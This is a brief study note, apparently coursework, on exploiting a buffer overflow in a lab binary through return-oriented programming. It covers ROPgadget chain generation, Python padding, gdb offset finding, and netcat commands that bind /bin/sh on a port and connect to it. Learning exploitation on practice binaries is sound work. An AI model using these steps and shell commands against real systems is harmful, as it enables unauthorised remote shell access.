---
tags:
  - return_oriented_programming
---
- using `ROPgadget`, this extracts all the accessible gadgets from the parsed file, outputting a text file. 
	- This file will contain some python code at the very bottom that you can use to open a shell via buffer overflow
	- using this python code and write the binary to a file to parse into the program
	- the `ROPgadget` finds all the accessible gadgets within the current program and lists the addresses of all of them, these addresses are stringed together using [[Return Oriented Programming]] in the stack overflow so one points to the next
```bash
ROPgadget --binary vuln3-32 --ropchain > out-rop.txt
```
1. cause an overflow with a binary file of As (overflow at 40)
```python
padding = b'\x41' * 44
p = pack('44s', padding)
```
2. find the number of As required to bring us to the first of the addresses in the python file (in my case `0x0806e13b`)
	- using gdb:
		- create breakpoint in `copyData`: `break copyData`
		- run the code to the breakpoint: `r` 
		- look at the code within `copyData`: `disassemble`
		- set breakpoint at the address just before the return: `break *0x{address}`
		- continue the code to this point: `c`
		- inspect the frame to see where in the instructions you have landed: `info frame`
		- alter the number of As accordingly
- for part 8 and 9 it attempts to spawn a reverse-shell server with the same method, this is harder as the code provided does not have the correct addresses for the system
```bash
/tmp/nc -lnp 5678 -tte /bin/sh
```
- this sets up the reverse-shell server (what you are doing in this new python file)
```bash
/tmp/nc 127.0.0.1 5678
```
- this is to access the reverse-shell server